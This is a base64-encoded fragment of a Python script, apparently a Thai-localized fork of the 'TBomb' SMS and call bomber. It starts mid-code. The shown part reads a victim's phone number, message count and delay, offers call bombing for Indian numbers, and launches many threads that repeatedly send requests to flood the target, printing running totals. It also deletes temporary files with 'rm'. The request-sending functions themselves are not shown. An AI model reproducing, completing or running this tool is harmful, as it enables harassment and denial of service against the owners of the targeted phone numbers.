ICAgICAgbm0gPSBpbnQoaW5wdXQoIuC4guC5ieC4reC4hOC4p+C4suC4oeC4l+C4teC5iOC4leC5ieC4reC4h+C4geC4suC4o+C4quC5iOC4hyIpKQogICAgICAgIGRsID0gZmxvYXQoCiAgICAgICAgICAgIGlucHV0KCJFbnRlciBEZWxheSB0aW1lIChpbiBzZWNvbmRzKSBbUmVjb21tZW5kZWQgMTAgc2VjIF0gOiAiKSkKbWF4bGltID0gMAppZiBjYyA9PSAiOTEiOgogICAgbWF4bGltID0gNTAwCmVsc2U6CiAgICBtYXhsaW0gPSAxMDAKaWYgbm0gPiBtYXhsaW06CiAgICBwcmludCgnXG5cblx0U29ycnkgRHVlIFRvIE1pc3VzZSBPZiBUaGlzIFNjcmlwdCBXZSBPbmx5IFByb3ZpZGUgJyArCiAgICAgICAgICBzdHIobWF4bGltKSArICcgU01TIEF0IE9uY2UuLi5cblxuJykKICAgIHByaW50KCdOdW1iZXIgT2YgU01TIEhhcyBiZWVuIFNldCBUbyAnICsgc3RyKG1heGxpbSkpCiAgICBubSA9IG1heGxpbQppZiBub3QgY2Muc3RyaXAoKSA9PSAiOTEiOgogICAgaWYgdHlwZSA9PSAxOgogICAgICAgIHByaW50KAogICAgICAgICAgICAnXHRcdFNvcnJ5IEJ1dCBDYWxsIEJvbWJpbmcgaXMgQ3VycmVudGx5IFN1cHBvcnRlZCBPbmx5IEZvciBJbmRpYW4gTnVtYmVycyEhISEnKQogICAgICAgIHByaW50KCkKICAgICAgICBpbnB1dCgnUHJlc3MgRW50ZXIgVG8gRXhpdC4uLi4nKQogICAgICAgIHByaW50KCdcblxuJykKICAgICAgICBiYW5uZXIoKQogICAgICAgIGV4aXQoKQogICAgY250ID0gMAogICAgaWYgcG4uc3RyaXAoKSA9PSAnJyBvciBkbCA8PSAwIG9yIG5tIDw9IDAgb3IgY2Muc3RyaXAoKSA9PSAnJyBvciBjYy5maW5kKCcrJykgIT0gLTE6CiAgICAgICAgcHJpbnQoJ1xuXG5cdFNlZW1zIExpa2UgWW91IEhhdmUgR2l2ZW4gV3JvbmcgSW5wdXRzLi4uJykKICAgICAgICBpbnB1dCgnXG5cdFx0UHJlc3MgRW50ZXIgVG8gRXhpdC4uLicpCiAgICAgICAgYmFubmVyKCkKICAgICAgICBleGl0KCkKICAgIGNoID0gWzAsIDE0LCAxNSwgMTZdCiAgICBzdGFydChwbiwgbm0sIGRsLCBjaCwgc3RyKGNjKSkKICAgIGV4aXQoKQpjaCA9IFtpIGZvciBpIGluIHJhbmdlKDE3KV0KY2JvbWIgPSBGYWxzZQppZiBwbi5zdHJpcCgpID09ICcnIG9yIGRsIDw9IDAgb3Igbm0gPCAwOgogICAgcHJpbnQoJ1xuXG5cdFNlZW1zIExpa2UgWW91IEhhdmUgR2l2ZW4gV3JvbmcgSW5wdXRzLi4uJykKICAgIGlucHV0KCdcblx0XHRQcmVzcyBFbnRlciBUbyBFeGl0Li4uJykKICAgIGJhbm5lcigpCiAgICBleGl0KCkKaWYgdHlwZSA9PSAxOgogICAgcHJpbnQoIk5PVEU6IENhbGwgQm9tYiBNaWdodCBOb3QgV29yayBvbiBETkQgQWN0aXZhdGVkIE51bWJlcnMuLi5cbiIpCiAgICBwcmludCgiXG5cdFBsZWFzZSBEb24ndCBPdmVybG9hZCBDYWxsIEJvbWIgU28gVGhhdCBJcyBXb3VsZCBXb3JrIEZvciBMb25nZXIgUGVyaW9kIE9mIFRpbWUuLi4iKQogICAgY2JvbWIgPSBUcnVlCmlmIGNib21iOgogICAgY2hsID0gWzEwMCwgMTAxLCAxMDIsIDEwMywgMTA0LCAxMDUsIDEwNl0KICAgIHN0YXJ0KHBuLCBubSwgZGwsIGNobCwgc3RyKGNjKSkKICAgIGV4aXQoKQppZiBubSA9PSAwOgogICAgbnQgPSBpbnQoaW5wdXQoIlx0TnVtYmVyIE9mIFRocmVhZHMoMTAgdG8gMjApIDogIikpCiAgICBpZiBudCA8PSAwIG9yIG50ID49IDMwOgogICAgICAgIHByaW50KCdcdFRCb21iIFNob3dzIEJldHRlciBSZXN1bHQgaW4gMTAgdG8gMjUgVGhyZWFkc1xuXHRcdFN0aWxsIENvbnRpbnVpbmcuLi4uJykKICAgIHByaW50KCJcblxuUGxlYXNlIFJlbWVtYmVyIFRoYXQgVGhpcyBJcyBpbiBFeHBlcmltZW50YWwgU3RhZ2UgQW5kIElzIEluY3JlZGlibHkgRmFzdC4uLiIpCiAgICB0ID0gW05vbmVdICogbnQKICAgIHByaW50KHJhbmRvbS5jaG9pY2UoY29sb3JzKSkKICAgIHByaW50KCJcblxuPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKICAgIHByaW50KCIgICAgICAgICAgICAgICAg4LmC4Lib4Lij4LmB4LiB4Lij4Lih4LiB4Liz4Lil4Lix4LiH4LiX4Liz4LiH4Liy4LiZ4Lit4Lii4LmI4Liy4Lit4Lit4LiBICEhICAgICAgICAgICAgICAgIikKICAgIHByaW50KCIgICAgIOC4geC4o+C4uOC4k+C4suC4o+C4reC4oeC4teC4nOC4peC4leC5iOC4reC4lOC4suC4leC5ieC4siAhISAgICAiKQogICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpCiAgICBwcmludCgiICAgICAgICAgICAgIOC4o+C4q+C4seC4quC4m+C4o+C4sOC5gOC4l+C4qCAgICAgICA6ICs2NiIsIHBuKQogICAgcHJpbnQoIiAgICAgICAgICAgICDguYDguJrguK3guKPguYzguKHguLfguK3guJbguLfguK0gICA6ICIsIG50KQogICAgcHJpbnQoIiAgICAgICAgICAgICDguJTguLXguYDguKXguKLguYwgICAgICAgICAgICAgICA6ICIsIGRsKQogICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpCiAgICBwcmludCgiICAgICAgICAg4LmD4LiK4LmJ4LmE4Lib4Lit4Lii4LmI4Liy4Lia4LmI4LiZICEhICAgICAgICAgICAgICAgICIpCiAgICBwcmludCgiICAgICAgICAg4LiE4LiZ4LiX4Liz4Lir4Liz4LmD4Lir4LiN4LmIICEhICAgICAgICAgICAgICAgICIpCiAgICBwcmludCgiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKICAgIHByaW50KFcpCiAgICBpbnB1dCgnXG5cblByZXNzIENUUkwrWiBUbyBTVE9QIEJvbWJlci4uLiBcblByZXNzIEVudGVyIFRvIFN0YXJ0IEJvbWJlci4uLlxuJykKICAgIG9zLnN5c3RlbSgncm0gKi54eHgqID4gL2Rldi9udWxsIDI+JjEnKQogICAgcHJpbnQoIlxuXG5TdGFydGluZyBCb21iLi4uLiIpCiAgICBmb3IgaSBpbiByYW5nZShudCk6CiAgICAgICAgdFtpXSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWluZmluaXRlLCBhcmdzPShwbiwgZGwsIGNoLCBtYXhsaW0sKSkKICAgICAgICB0W2ldLmRhZW1vbiA9IFRydWUKICAgICAgICB0W2ldLnN0YXJ0KCkKICAgIHRpbWUuc2xlZXAoMikKICAgIGNpID0gMAogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjaSArPSAxCiAgICAgICAgbCA9IGNvdW50X2luZgogICAgICAgIHByaW50KCIgICAgVG90YWwgTnVtYmVyIG9mIFJlcXVlc3RzIFNlbnQgOiAiLCBsKQogICAgICAgIGlmIGludChsKSA+IG1heGxpbToKICAgICAgICAgICAgcHJpbnQoJ1xuXG5cdFNvcnJ5IER1ZSBUbyBNaXN1c2UgT2YgVGhpcyBTY3JpcHQgV2UgT25seSBQcm92aWRlICcgKwogICAgICAgICAgICAgICAgICBzdHIobWF4bGltKSArICcgU01TIEF0IE9uY2UuLi5cblxuJykKICAgICAgICAgICAgaW5wdXQoJ1ByZXNzIEVudGVyIFRvIEV4aXQuLi4nKQogICAgICAgICAgICBvcy5zeXN0ZW0oJ3JtICp4eHgqID4gL2Rldi9udWxsIDI+JjEnKQogICAgICAgICAgICBiYW5uZXIoKQogICAgICAgICAgICBleGl0KCkKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgaWYgY2kgJSAzID09IDA6CiAgICAgICAgICAgIGNoZWNraW50ZXJuZXQoKQplbHNlOgogICAgc3RhcnQocG4sIG5tLCBkbCwgY2gsICc5MScpCiAgICBleGl0KCk=
